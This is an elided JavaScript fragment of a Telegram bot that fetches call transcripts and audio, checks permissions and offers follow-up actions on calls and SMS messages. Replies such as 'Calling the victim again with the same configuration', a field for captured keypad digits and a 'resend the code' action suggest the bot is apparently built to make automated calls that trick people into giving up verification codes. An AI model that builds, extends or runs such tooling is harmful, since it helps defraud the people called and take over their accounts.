...
async function sendFullTranscriptFromApi(ctx, callSid) {
  ...
  try {
    const response = await httpClient.get(
      ctx,
      `${config.apiUrl}/api/calls/${callSid}`,
      { timeout: 15000 },
    );
    ...
    await ctx.reply(
      "❌ Unable to retrieve full transcript. Please try again later.",
    );
    return;
  }
  ...
  const startTime = callData.started_at
    ...
    : "Unknown";
  const digitSummary = callData.digit_summary
    ? escapeHtml(callData.digit_summary)
    : "";
...
async function sendTranscriptAudioFromApi(ctx, callSid) {
  ...
  try {
    ...
    console.error(
      "Transcript audio call fetch error:",
      error?.message || error,
    );
  ...
  const isAdminUser = await new Promise((resolve) =>
    isAdmin(ctx.from.id, resolve),
  );
  if (
    callData?.user_chat_id &&
    callData.user_chat_id !== ctx.from.id &&
    !isAdminUser
  ) {
    await ctx.reply(
      "❌ You are not authorized to access transcript audio for this call.",
    );
    return;
  }
  ...
  for (let attempt = 0; attempt < maxAttempts; attempt += 1) {
    ...
    try {
      response = await httpClient.get(
        ctx,
        `${config.apiUrl}/api/calls/${callSid}/transcript/audio`,
        {
      ...
      await ctx.reply(
        "❌ Failed to fetch transcript audio. Sending text transcript instead.",
      );
    ...
    if (response.status === 200) {
      ...
      if (!audioBuffer.length) {
        await ctx.reply(
          "❌ Transcript audio is empty. Sending text transcript instead.",
        );
        await sendFullTranscriptFromApi(ctx, callSid);
        return;
      }
    ...
    if (response.status === 404) {
      await ctx.reply(
        "❌ Transcript audio is not available for this call. Sending text transcript instead.",
      );
      await sendFullTranscriptFromApi(ctx, callSid);
      return;
    }
  ...
  await ctx.reply(
    "⏳ Transcript audio is still generating. Sending text transcript for now.",
  );
  await sendFullTranscriptFromApi(ctx, callSid);
}
...
async function handleCallFollowUp(ctx, callSid, followAction) {
  ...
  const allowed = await requireCapability(ctx, "call_followup", {
  ...
  try {
    ...
    await ctx.reply(
      "❌ Unable to retrieve call details. Please try again later.",
    );
    return;
  }
  ...
  switch (action) {
    case "recap": {
      const rawSummary =
        callData.call_summary || "No recap is available yet for this call.";
      const summary =
        rawSummary.length > 1200 ? `${rawSummary.slice(0, 1200)}…` : rawSummary;
    ...
    case "schedule": {
      if (!callData.phone_number) {
        await ctx.reply(
          "❌ Cannot schedule follow-up: original phone number missing.",
        );
        return;
      }
      ...
      try {
        ...
        await ctx.reply(
          "❌ Unable to start scheduling flow. You can use /sms to schedule manually.",
        );
      }
      break;
    }
    ...
    case "reassign": {
      ...
      try {
        ...
        await ctx.reply(
          "❌ Unable to start call flow. You can use /call to retry manually.",
        );
      }
      break;
    }
    ...
    case "callagain": {
      if (!callData.phone_number) {
        await ctx.reply(
          "❌ Cannot place the follow-up call because the phone number is missing.",
        );
        return;
      }
      ctx.session.meta = ctx.session.meta || {};
      ...
      await ctx.reply(
        "☎️ Calling the victim again with the same configuration...",
      );
      try {
        await ctx.conversation.enter("call-conversation");
      } catch (error) {
        ...
        await ctx.reply(
          "❌ Unable to start the call flow. You can use /call to retry manually.",
        );
      }
      break;
    }
    case "skip": {
      await ctx.reply(
        "👍 Noted. Skipping the follow-up for now—you can revisit this call anytime from /calllog.",
      );
      break;
    }
    case "resend": {
      if (!callData.phone_number) {
        await ctx.reply(
          "❌ Cannot resend the code: original phone number missing.",
        );
        return;
      }
      ctx.session.meta = ctx.session.meta || {};
      ...
      try {
        ...
        await ctx.reply(
          "❌ Unable to start SMS flow. You can use /sms to send the code manually.",
        );
      }
      break;
    }
...
async function handleSmsFollowUp(ctx, phone, followAction) {
  ...
  const allowed = await requireCapability(ctx, "sms_send", {
    actionLabel: "SMS follow-up",
  });
  if (!allowed) {
    return;
  }
  ...
  switch (action) {
    case "new": {
      ...
      try {
        ...
        await ctx.reply(
          "❌ Unable to start SMS flow. You can use /sms to continue manually.",
        );
      }
      break;
    }
    ...
    case "schedule": {
      ...
      try {
        ...
        await ctx.reply(
          "❌ Unable to start schedule flow. You can use /sms to schedule manually.",
        );
      }
      break;
    }
...
bot.on("callback_query:data", async (ctx) => {
  ...
  try {
      ...
      if (recapAction === "sms") {
        ...
        try {
          ...
          const normalizedStatus = normalizeCallStatus(
            callData.status || callData.twilio_status || "completed",
          );
          const status = normalizedStatus.replace(/_/g, " ");
          const duration = callData.duration
            ? ` Duration: ${formatDuration(callData.duration)}.`
            : "";
          const summaryRaw = (callData.call_summary || "")
            .replace(/\s+/g, " ")
            .trim();
          const summary =
            normalizedStatus === "completed"
              ? summaryRaw
                ? summaryRaw.slice(0, 180)
                : "Call finished."
          ...
          await ctx.reply(
            "❌ Failed to send recap SMS. Please try again later.",
          );
    ...
    switch (action) {
      ...
      case "TEST_API":
        await ctx.reply(
          "ℹ️ /testapi has been retired. Use /status for diagnostics.",
        );
        finishMetric("ok");
        break;
...
async function executeCallsCommand(ctx) {
  try {
    ...
    console.log(
      `Successfully fetched ${calls.length} calls from: ${successfulEndpoint}`,
    );
    ...
    if (error.response?.status === 404) {
      ...
      await ctx.reply(
        "❌ Server error while fetching calls. Please try again later.",
      );
